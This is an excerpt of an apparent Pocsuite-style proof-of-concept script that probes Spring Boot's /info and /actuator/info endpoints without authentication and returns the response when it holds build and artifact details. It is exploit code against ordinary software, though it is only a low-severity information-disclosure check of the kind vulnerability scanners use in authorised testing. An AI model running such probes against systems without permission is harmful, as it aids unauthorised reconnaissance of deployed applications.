...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth info Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/info","/actuator/info"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "build" in res.text and "artifact" in res.text and "application" in res.text:
                return res.text
